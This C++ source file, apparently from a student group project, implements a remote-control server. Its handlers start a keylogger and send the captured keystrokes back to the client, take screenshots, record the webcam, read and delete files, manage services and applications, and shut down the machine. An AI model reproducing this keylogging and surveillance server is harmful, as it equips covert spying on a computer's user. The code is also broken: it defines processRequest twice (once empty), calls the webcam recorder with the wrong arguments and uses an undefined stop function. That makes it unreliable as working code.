#include "Server.h"
#include "App.h"
#include "KeyLogger.h"
#include "File.h"
#include "Service.h"

bool Server::keylog(Request& request, Response &response) {
    static KeyLogger keylog;

    string subaction = request.getParam(kSubAction);
    response.putParam(kStatus, "Ok");
    
    if (subaction == "Start") {
        cout << "Started keylogger\n";
        keylog.startKeylogger(); 
    } else if (subaction == "Stop") {
        cout << "Stopped keylogger\n";
        keylog.stopKeylogger();

        ifstream fin = keylog.getLoggingStream();
        string content; 
        string buf;
        while (getline(fin, buf)) {
            content += buf + "\n"; 
        }
        fin.close();
    
        response.putParam(kBody, content);

        // Gui file
        fin = ifstream("tmt.txt", fstream::binary);
        
        response.putParam(kFilePrefix + "tmt.txt", "");
    }  

    return true;
}

bool Server::handleShutdownSystem(Request& request, Response &response){
    App app;
    app.shutdownSystem();
    response.putParam(kStatus, "Shutdown initiated");
    return true;
}
bool Server::handleRestartSystem(Request& request, Response &response){
    App app;
    app.restartSystem();
    response.putParam(kStatus, "Restart initiated");
    return true;
}

bool Server::listRunningApps(Request& request, Response &response){
    App app;
    std::vector<std::string> appList = app.getRunningTaskbarApps();
    std::string appList_str = "Running Application: \n";
    for (int i = 0; i < appList.size(); i++){
        appList_str += std::to_string(i + 1) + ". " + appList[i] + "\n";
    }
    response.putParam(kBody, appList_str);
    return true;
}

bool Server::closeApp(Request& request, Response& response){
    App app;
    std::vector<std::string> appList = app.getRunningTaskbarApps();

    int appIndex = std::stoi(request.getParam("AppIndex"));
    if (appIndex <= 0 || appIndex > appList.size()){
        response.putParam(kStatus, "Invalid index");
        return false;
    }
    std::string appName = appList[appIndex - 1];
    bool success = app.closeApplication(appName);
    response.putParam(kStatus, success ? "Closed" : "Failed to close");
    return true;
}

bool Server::listInstalledApps(Request& request, Response& response){
    App app;
    std::vector<AppInfo> appList = app.getInstalledApps();
    std::string appList_str = "Installed application: \n";
    for (int i = 0; i < appList.size(); i++){
        appList_str += std::to_string(i + 1) + ". " + appList[i].name + "\n";
    }
    response.putParam(kBody, appList_str);
    return true;
}

bool Server::runApp(Request& request, Response &response){
    App app;
    std::vector<AppInfo> appList = app.getInstalledApps();

    int appIndex = std::stoi(request.getParam("AppIndex"));
    if (appIndex <= 0 || appIndex > appList.size()){
        response.putParam(kStatus, "Invalid index");
        return false;
    }
    std::string appPath = appList[appIndex - 1].fullpath;
    bool success = app.runApplication(appPath);
    response.putParam(kBody, success ? "App is running" : "Failed to run");
    return true;
}

bool Server::handleApp(Request& request, Response& response){
    std::string subAction = request.getParam(kSubAction);
    if (subAction == "listrunningapps")
        return listRunningApps(request, response);
    else if (subAction == "closeapp")
        return closeApp(request, response);
    else if (subAction == "listinstalledapps")
        return listInstalledApps(request, response);
    else if (subAction == "runapp")
        return runApp(request, response);
    else{
        response.putParam(kStatus, "Invalid subaction");
        return false;
    }
}


// Thang : File & Service
// ---Start---
bool handleGetFile(Request& request, Response& response){
    File file;
    string file_name = request.getParam(kFilePrefix + "tmt.txt"); // Thêm dùm tui khúc này nha Thịnh
    string file_content = file.readFile(file_name);
    response.putParam(kBody, file_content);
    return true;
    
}

bool handleDeleteFile(Request& request, Response& response){
    File file;
    string file_name = request.getParam(kFilePrefix + "tmt.txt"); // Thêm dùm tui khúc này nha Thịnh
    file.deleteFile(file_name);
    response.putParam(kStatus, "Deleted File");
    return true;
}

bool listRunningService(Request& request, Response& response){
    Service service;
    string list_service = service.listRunningServices();
    response.putParam(kBody, list_service);
    return true;
}

bool handleStartService(Request& request, Response& response){
    Service service;
    string name_service = request.getParam(kSubAction);
    service.StartServiceByName(name_service);
    response.putParam(kStatus, "Started service");
    return true;
}

bool handleStopService(Request& request, Response& response){
    Service service;
    string name_service = request.getParam(kSubAction);
    service.StopServiceByName(name_service);
    response.putParam(kStatus, "Stopped service");
    return true;
}
// ---End--- (File & Service)

bool Server::processRequest(Request& request, Response &response) {
    cout << "Processing Request\n" << request << "\n";
    response.setAction(request.getAction());
    response.setParams(request.getParams());

    // TODO param order
    
    switch (request.getAction()) {
        case ACTION_KEYLOG:
            return keylog(request, response);
        case ACTION_SHUTDOWN:
            return handleShutdownSystem(request, response);
        case ACTION_RESTART:
            return handleRestartSystem(request, response);
        case ACTION_APP:
            return handleApp(request, response);
        default:
            return false;
    }
}

//Duc

inline LONG GetFilePointer(HANDLE FileHandle)
{
    return SetFilePointer(FileHandle, 0, 0, FILE_CURRENT);
}

extern bool SaveBMPFile(char *filename, HBITMAP bitmap, HDC bitmapDC, int width, int height)
{
    bool Success = false;
    HDC SurfDC = NULL;                   
    HBITMAP OffscrBmp = NULL;             
    HDC OffscrDC = NULL;                   
    LPBITMAPINFO lpbi = NULL;              
    LPVOID lpvBits = NULL;                 
    HANDLE BmpFile = INVALID_HANDLE_VALUE; 
    BITMAPFILEHEADER bmfh;                 

    if ((OffscrBmp = CreateCompatibleBitmap(bitmapDC, width, height)) == NULL)
        return false;
    if ((OffscrDC = CreateCompatibleDC(bitmapDC)) == NULL)
        return false;
    HBITMAP OldBmp = (HBITMAP)SelectObject(OffscrDC, OffscrBmp);
    BitBlt(OffscrDC, 0, 0, width, height, bitmapDC, 0, 0, SRCCOPY);
    if ((lpbi = (LPBITMAPINFO)(new char[sizeof(BITMAPINFOHEADER) + 256 * sizeof(RGBQUAD)])) == NULL)
        return false;

    ZeroMemory(&lpbi->bmiHeader, sizeof(BITMAPINFOHEADER));
    lpbi->bmiHeader.biSize = sizeof(BITMAPINFOHEADER);

    SelectObject(OffscrDC, OldBmp);
    if (!GetDIBits(OffscrDC, OffscrBmp, 0, height, NULL, lpbi, DIB_RGB_COLORS))
        return false;

    if ((lpvBits = new char[lpbi->bmiHeader.biSizeImage]) == NULL)
        return false;

    if (!GetDIBits(OffscrDC, OffscrBmp, 0, height, lpvBits, lpbi, DIB_RGB_COLORS))
        return false;
    if ((BmpFile = CreateFile(filename,
                              GENERIC_WRITE,
                              0, NULL,
                              CREATE_NEW, 
                              FILE_ATTRIBUTE_NORMAL,
                              NULL)) == INVALID_HANDLE_VALUE)

        return false;
    DWORD Written;

    bmfh.bfType = 19778;
    bmfh.bfReserved1 = bmfh.bfReserved2 = 0;
    if (!WriteFile(BmpFile, &bmfh, sizeof(bmfh), &Written, NULL))
        return false;
    if (Written < sizeof(bmfh))
        return false;
    if (!WriteFile(BmpFile, &lpbi->bmiHeader, sizeof(BITMAPINFOHEADER), &Written, NULL))
        return false;

    if (Written < sizeof(BITMAPINFOHEADER))
        return false;

    int PalEntries;
    if (lpbi->bmiHeader.biCompression == BI_BITFIELDS)
        PalEntries = 3;
    else
        PalEntries = (lpbi->bmiHeader.biBitCount <= 8) ?(int)(1 << lpbi->bmiHeader.biBitCount): 0;

    if (lpbi->bmiHeader.biClrUsed)
        PalEntries = lpbi->bmiHeader.biClrUsed;

    if (PalEntries)
    {
        if (!WriteFile(BmpFile, &lpbi->bmiColors, PalEntries * sizeof(RGBQUAD), &Written, NULL))
            return false;

        if (Written < PalEntries * sizeof(RGBQUAD))
            return false;
    }

    bmfh.bfOffBits = GetFilePointer(BmpFile);

    if (!WriteFile(BmpFile, lpvBits, lpbi->bmiHeader.biSizeImage, &Written, NULL))
        return false;

    if (Written < lpbi->bmiHeader.biSizeImage)
        return false;

    bmfh.bfSize = GetFilePointer(BmpFile);

    SetFilePointer(BmpFile, 0, 0, FILE_BEGIN);
    if (!WriteFile(BmpFile, &bmfh, sizeof(bmfh), &Written, NULL))
        return false;

    if (Written < sizeof(bmfh))
        return false;

    delete[] lpbi; 
    delete[] lpvBits; 

    return true;
}

bool ScreenCapture(int x, int y, int width, int height, char *filename)
{
    HDC hDc = CreateCompatibleDC(0);
    HBITMAP hBmp = CreateCompatibleBitmap(GetDC(0), width, height);
    SelectObject(hDc, hBmp);
    BitBlt(hDc, 0, 0, width, height, GetDC(0), x, y, SRCCOPY);
    bool ret = SaveBMPFile(filename, hBmp, hDc, width, height);
    DeleteObject(hBmp);
    return ret;
}

bool Server::screenshot(Request& request, Response &response){
    std::string subaction = request.getParam(kSubAction);
    response.putParam(kStatus, "Ok");

    if (subaction == "Screenshot") {
        std::cout << "Started screenshot!\n";

        bool success = ScreenCapture(0, 0, 1920, 1080, "../build/files/screencapture.bmp");
        if (success) {
            std::cout << "Screenshot taken successfully" << std::endl;
        } else {
            std::cerr << "Error! Cannot take screenshot!" << std::endl;
            response.putParam(kStatus, "Error: Failed to capture screenshot");
        }
    }
    response.putParam(kFilePrefix + "screenshot.bmp", "");
    return true;
}


std::atomic<bool> isRecording(false);
cv::VideoCapture cap;
cv::VideoWriter writer;

bool StartWebcamRecording(const std::string& filename, bool &flag) {
    // Open default webcam (device 0)
    VideoCapture capture(0);
    if (!capture.isOpened())
    {
        cerr << "Error: Unable to open the webcam." << endl;
        return 0;
    }

    // Get frame size
    Size frameSize((int)capture.get(CAP_PROP_FRAME_WIDTH), (int)capture.get(CAP_PROP_FRAME_HEIGHT));

    // Print frame size for debugging
    cout << "Frame size: " << frameSize.width << "x" << frameSize.height << endl;

    // Create a window
    namedWindow("Webcam", WINDOW_AUTOSIZE);

    // Initialize video writer to save the video
    VideoWriter writer(filename.c_str(), VideoWriter::fourcc('m', 'p', '4', 'v'), 30, frameSize);

    if (!writer.isOpened())
    {
        cerr << "Error: Unable to open video writer." << endl;
        return 0;
    }

    Mat frame;
    while (true)
    {
        capture >> frame; // Capture a new frame
        if (frame.empty())
        {
            cerr << "Error: Blank frame captured." << endl;
            break;
        }

        // Write frame to video file
        writer.write(frame);

        // Show the captured frame
        imshow("Webcam", frame);

        // Break if 'Esc' key is pressed
        char c = (char)waitKey(33);
        if (c == 27)
            break;
    }

    // Release resources
    capture.release();
    writer.release();
    destroyAllWindows();
    return true;
}

bool Server::getVideoByWebcam(Request& request, Response &response) {
    std::string subaction = request.getParam(kSubAction);
    response.putParam(kStatus, "Ok");

    if (subaction == "Start") {
        const string filename = "../build/files/videowebcam.mp4";
        bool result = StartWebcamRecording(filename);
        if (!result) {
            response.putParam(kStatus, "Error: Failed to start recording.");
        }
    }
    else if (subaction == "Stop") {
        bool result = StopWebcamRecording();  // Dừng quay
        if (!result) {
            response.putParam(kStatus, "Error: Failed to stop recording.");
        }
    }
    response.putParam(kFilePrefix + "video.mp4", "");
    return true;
}


bool Server::processRequest(Request& request, Response &response){

}